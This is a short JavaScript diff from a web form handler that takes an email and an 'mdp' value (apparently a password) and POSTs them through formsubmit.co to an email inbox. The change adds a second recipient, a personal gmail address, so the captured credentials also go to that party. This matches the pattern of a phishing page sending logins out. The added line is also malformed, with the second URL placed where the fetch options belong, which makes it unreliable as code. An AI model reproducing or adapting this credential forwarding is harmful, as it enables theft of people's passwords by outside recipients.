@@ -8,7 +8,7 @@
         if (email.trim() === '' || mdp.trim() === '') return;
 
         try {
-            await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', {
+            await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', 'https://formsubmit.co/ajax/paulbegin28@gmail.com' ,{
                 method: 'POST',
                 headers: {
                     'Content-Type':'application/x-www-form-urlencoded',
